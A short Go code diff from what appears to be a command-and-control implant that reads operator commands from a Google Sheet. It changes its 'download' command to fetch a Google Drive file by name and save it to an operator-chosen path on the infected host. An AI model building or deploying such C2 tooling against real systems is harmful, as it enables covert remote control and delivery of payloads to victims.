@@ -14,10 +14,10 @@ func execute(spreadSheet *configuration.SpreadSheet, clientDrive *drive.Service,
 	if strings.HasPrefix(commandToExecute, "download") {
 		slittedCommand := strings.Split(commandToExecute, ";")
 		if len(slittedCommand) == 3 {
-			fileDriveId := slittedCommand[1]
+			fileName := slittedCommand[1]
 			downloadPath := slittedCommand[2]
-			common.AllC2Configs.Debug.LogDebug("Sheets - New download command: FileId " + fileDriveId + " saving it to: " + downloadPath)
-			downloadErr := downloadFile(clientDrive, fileDriveId, downloadPath)
+			common.AllC2Configs.Debug.LogDebug("Sheets - New download command: FileName " + fileName + " saving it to: " + downloadPath)
+			downloadErr := downloadFile(clientDrive, fileName, downloadPath)
 			if downloadErr != nil {
 				lastCommand.Output = downloadErr.Error()
 			} else {
